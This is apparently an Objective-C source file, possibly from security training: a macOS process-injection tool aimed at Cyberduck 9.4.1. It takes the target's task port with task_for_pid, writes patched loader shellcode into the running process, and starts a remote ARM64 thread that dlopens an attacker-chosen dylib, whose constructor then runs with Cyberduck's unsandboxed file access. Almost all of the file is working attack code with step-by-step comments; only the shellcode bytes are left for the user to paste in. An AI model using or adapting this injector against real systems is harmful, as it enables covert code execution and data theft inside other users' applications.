// cyberduck-inject-dylib.m
// Full dylib injector using Mach task_for_pid + pthread thread promotion.
// Target: Cyberduck 9.4.1 (direct download — NOT App Store version)
//
// Compile:
//   clang -framework Foundation -o cyberduck-inject-dylib cyberduck-inject-dylib.m
//
// Usage:
//   sudo ./cyberduck-inject-dylib <PID> [/path/to/inject.dylib]
//   Default dylib path: ~/Library/Colors/inject.dylib
//
// ── How it works ─────────────────────────────────────────────────────────────
//
//  1. Resolve live addresses for dlopen, pthread_create_from_mach_thread,
//     and pthread_exit from the dyld shared cache.
//     KEY INSIGHT: These addresses are IDENTICAL in every process on this machine.
//     The shared cache ASLR slide is generated once at kernel boot and applied
//     system-wide. My address for dlopen IS Cyberduck's address for dlopen.
//
//  2. Scan the loader_shellcode[] byte array for 8-byte ASCII placeholder strings
//     ("DLOPEN__", "PTHRDCRT", "PTHRDEXT", "LIBLIBLIB...") and overwrite each
//     with the corresponding live 64-bit address or the dylib path string.
//     By the time mach_vm_write() fires, all placeholders are real pointers.
//
//  3. Inject the patched shellcode the same way as the shellcode injector:
//     task_for_pid → mach_vm_allocate → mach_vm_write → vm_protect
//     → thread_create_running
//
//  4. Stage 1 (loader_shellcode) runs in a bare Mach thread:
//     → calls pthread_create_from_mach_thread() → spawns Stage 2 POSIX thread
//     → calls pthread_exit() to cleanly exit itself
//
//  5. Stage 2 (POSIX thread) can now safely call high-level BSD functions:
//     → dlopen(path, RTLD_NOW)
//     → dylib's __attribute__((constructor)) fires automatically
//     → payload runs inside Cyberduck's process with unrestricted user filesystem access
//        (Cyberduck is app-sandbox=false — no TCC restrictions apply)
//
// ─────────────────────────────────────────────────────────────────────────────
//
// BEFORE COMPILING:
//   You must paste the contents of 'xxd -i loader.bin' into the
//   loader_shellcode[] array below. See README.md for the exact commands.
//   Compile loader.asm → extract __text section → paste here.
//
// ─────────────────────────────────────────────────────────────────────────────

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define STACK_SIZE 0x4000    // 16 KB — generous for POSIX thread startup overhead
#define CODE_SIZE  256       // Must be >= assembled loader.asm size + placeholder data

// pthread_create_from_mach_thread is exported by libpthread but not in public headers.
// Declaring it directly avoids needing dlsym() for this one symbol.
extern int pthread_create_from_mach_thread(pthread_t *,
    const pthread_attr_t *, void *(*)(void *), void *);

// ── loader_shellcode[] ────────────────────────────────────────────────────────
// Paste the output of 'xxd -i loader.bin' here.
//
// The placeholder strings are ASCII-visible in the hex dump:
//   "DLOPEN__" → 44 4c 4f 50 45 4e 5f 5f
//   "PTHRDCRT" → 50 54 48 52 44 43 52 54
//   "PTHRDEXT" → 50 54 48 52 44 45 58 54
//   "LIBLIBLIB..." visible near the end
//
// If you do NOT see these strings in your xxd output, the assembly step failed.
//
unsigned char loader_shellcode[CODE_SIZE] = {
    // TODO: replace this 0 with the output of:
    //   as loader.asm -o loader.o
    //   OFFSET=$(otool -l loader.o | grep -A10 "__text" | grep "offset" | awk '{print $2}' | head -1)
    //   SIZE=$(otool -l loader.o | grep -A10 "__text" | grep "^ size" | awk '{print $2}' | head -1)
    //   dd if=loader.o of=loader.bin bs=1 skip=$OFFSET count=$((SIZE)) 2>/dev/null
    //   xxd -i loader.bin
    0
};

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <pid> [dylib_path]\n"
                        "  Default dylib: ~/Library/Colors/inject.dylib\n", argv[0]);
        return 1;
    }

    pid_t pid = (pid_t)atoi(argv[1]);

    // ── Build dylib path ──────────────────────────────────────────────────────
    char dylib_path[256];
    if (argc >= 3) {
        strncpy(dylib_path, argv[2], sizeof(dylib_path) - 1);
        dylib_path[sizeof(dylib_path) - 1] = '\0';
    } else {
        const char *home = getenv("HOME");
        if (!home) home = "/Users/offsec";
        snprintf(dylib_path, sizeof(dylib_path), "%s/Library/Colors/inject.dylib", home);
    }

    printf("[*] Target PID:  %d\n", pid);
    printf("[*] Dylib path:  %s\n", dylib_path);

    // ── Step 1: Resolve function addresses from dyld shared cache ─────────────
    // dlopen, pthread_create_from_mach_thread, and pthread_exit all live in
    // Apple's shared cache. The cache is mapped identically across all processes.
    // The ASLR randomization happens once at boot — same offset for every process.
    uint64_t addr_dlopen    = (uint64_t)dlopen;
    uint64_t addr_pthr_crt  = (uint64_t)pthread_create_from_mach_thread;
    uint64_t addr_pthr_exit = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");

    printf("[*] Shared cache addresses (identical in ALL processes this boot):\n");
    printf("    dlopen:                          0x%016llx\n", addr_dlopen);
    printf("    pthread_create_from_mach_thread: 0x%016llx\n", addr_pthr_crt);
    printf("    pthread_exit:                    0x%016llx\n", addr_pthr_exit);

    if (!addr_dlopen || !addr_pthr_crt || !addr_pthr_exit) {
        fprintf(stderr, "[-] Failed to resolve one or more function addresses.\n");
        return -1;
    }

    // ── Step 2: Patch placeholder slots in the shellcode ─────────────────────
    // Walk the shellcode byte-by-byte. When an 8-byte ASCII marker is found,
    // overwrite it with the corresponding 64-bit pointer value.
    // The dylib path string overwrites the 52-byte LIBLIBLIB... slot.
    // Patching happens in OUR memory — the shellcode reaches Cyberduck clean.
    char *p = (char *)loader_shellcode;
    int found_dlopen = 0, found_crt = 0, found_exit = 0, found_path = 0;

    for (int i = 0; i < CODE_SIZE - 9; i++, p++) {
        if (!found_dlopen && memcmp(p, "DLOPEN__", 8) == 0) {
            memcpy(p, &addr_dlopen, 8);
            found_dlopen = 1;
            printf("[+] Patched DLOPEN__  at offset %d → 0x%016llx\n", i, addr_dlopen);
        }
        if (!found_crt && memcmp(p, "PTHRDCRT", 8) == 0) {
            memcpy(p, &addr_pthr_crt, 8);
            found_crt = 1;
            printf("[+] Patched PTHRDCRT at offset %d → 0x%016llx\n", i, addr_pthr_crt);
        }
        if (!found_exit && memcmp(p, "PTHRDEXT", 8) == 0) {
            memcpy(p, &addr_pthr_exit, 8);
            found_exit = 1;
            printf("[+] Patched PTHRDEXT at offset %d → 0x%016llx\n", i, addr_pthr_exit);
        }
        if (!found_path && memcmp(p, "LIBLIBLIB", 9) == 0) {
            memset(p, 0, 52);
            strncpy(p, dylib_path, 51);
            found_path = 1;
            printf("[+] Patched path     at offset %d → %s\n", i, dylib_path);
        }
    }

    // All four slots must be found — if any are missing, bytes weren't pasted
    if (!found_dlopen || !found_crt || !found_exit || !found_path) {
        fprintf(stderr,
            "[-] Patching incomplete!\n"
            "    Did you paste the 'xxd -i loader.bin' output into loader_shellcode[]?\n"
            "    dlopen=%d  pthr_crt=%d  pthr_exit=%d  path=%d\n",
            found_dlopen, found_crt, found_exit, found_path);
        return -1;
    }
    printf("[+] Shellcode fully patched — all placeholders replaced with live addresses.\n");

    // ── Step 3: Acquire Cyberduck's task control port ─────────────────────────
    task_t remoteTask;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] task_for_pid: %s\n"
                        "    Root? Correct PID? (SIP does not need to be disabled for Cyberduck)\n",
                mach_error_string(kr));
        return -1;
    }
    printf("[+] Task port: 0x%x\n", remoteTask);

    // ── Step 4: Allocate remote stack and code pages inside Cyberduck ─────────
    mach_vm_address_t remoteStack64 = 0, remoteCode64 = 0;

    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_allocate (stack): %s\n", mach_error_string(kr));
        return -1;
    }
    kr = mach_vm_allocate(remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_allocate (code): %s\n", mach_error_string(kr));
        return -1;
    }
    printf("[+] Remote stack: 0x%llx   code: 0x%llx\n", remoteStack64, remoteCode64);

    // ── Step 5: Write patched shellcode into Cyberduck's memory ──────────────
    kr = mach_vm_write(remoteTask, remoteCode64, (vm_address_t)loader_shellcode, CODE_SIZE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_write: %s\n", mach_error_string(kr));
        return -1;
    }
    printf("[+] Patched shellcode written to Cyberduck's address space.\n");

    // ── Step 6: Set W^X permissions ───────────────────────────────────────────
    kr = vm_protect(remoteTask, remoteCode64, CODE_SIZE, FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] vm_protect (code RX): %s\n", mach_error_string(kr));
        return -1;
    }
    kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE,
                    VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] vm_protect (stack RW): %s\n", mach_error_string(kr));
        return -1;
    }
    printf("[+] W^X enforced.\n");

    // ── Step 7: Configure ARM64 thread state ──────────────────────────────────
    struct arm_unified_thread_state remoteThreadState64;
    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count  = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (uint64_t)remoteCode64;
    remoteThreadState64.ts_64.__sp = (uint64_t)(remoteStack64 + STACK_SIZE / 2);
    printf("[*] PC=0x%llx  SP=0x%llx\n",
           remoteThreadState64.ts_64.__pc,
           remoteThreadState64.ts_64.__sp);

    // ── Step 8: Detonate — thread starts immediately inside Cyberduck ─────────
    thread_act_t remoteThread;
    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64,
                               (thread_state_t)&remoteThreadState64.ts_64,
                               ARM_THREAD_STATE64_COUNT, &remoteThread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] thread_create_running: %s\n", mach_error_string(kr));
        return -1;
    }

    printf("[+] Stage 1 thread running: 0x%x\n", remoteThread);
    printf("[+] → pthread_create_from_mach_thread bridges Mach → POSIX\n");
    printf("[+] → Stage 2 POSIX thread calls dlopen('%s')\n", dylib_path);
    printf("[+] → Constructor payload fires inside Cyberduck's process\n");
    printf("[+] Watch: log stream --style syslog "
           "--predicate 'eventMessage CONTAINS[c] \"INJECTED\"'\n");
    return 0;
}
